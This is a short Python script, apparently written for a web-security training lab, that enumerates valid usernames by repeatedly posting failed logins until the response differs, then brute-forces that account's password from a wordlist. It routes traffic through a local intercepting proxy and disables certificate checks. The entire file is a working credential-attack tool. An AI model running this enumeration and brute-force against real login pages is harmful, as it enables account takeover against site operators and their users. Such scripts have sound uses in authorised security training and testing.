import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if(len(sys.argv) != 2): 
    print("Usage: different_response.py <url>")
    sys.exit(0)

url = sys.argv[1]
#word = sys.argv[2]

r = requests.get(url)

cookie_value = r.cookies['session']
#print(cookie_value)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
file1 = open('creds/usernames1','r')
names = file1.readlines()
username = ""
for name in names:
    for tp in range(0,5):
        headers = {'session': cookie_value}
        pay = {'username': name[:-1],'password': 'test'}

        p = requests.post(url+'login', headers=headers, data = pay, proxies=proxies, verify=False)
        print("Tried "+ name[:-1], end="\r", flush=True)
        #print("---------------------------------------------")
        #print("---------------------------------------------")
        #print(p.status_code)
        #print("---------------------------------------------")
        #print("---------------------------------------------")
        #print(p.text)
        #print("---------------------------------------------")
        #print("---------------------------------------------")
        if "Invalid username or password." in p.text:
            #print("continueing")
            continue
        else:
            #print(p.status_code)
            #print(p.text)
            print("\n Username : "+name[:-1])
            username = name[:-1]
            break

file2 = open('creds/passwords1','r')
passwords = file2.readlines()
password = ""

for passwd in passwords:
    headers = {'session' : cookie_value}
    #print(username)
    pay = {'username': username, 'password' : passwd[:-1]}

    #p = requests.post(url+'login', headers=headers, data = pay, proxies=proxies, verify=False)
    p = requests.post(url+'login', headers=headers, data=pay)
    print("Tried " + passwd[:-1], end="\r", flush=True)
    #print(p.text)
    if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in p.text or "Invalid username or password." in p.text :
        continue
    else:
        print("\n Password: "+passwd[:-1])
        password = passwd[:-1]
        break
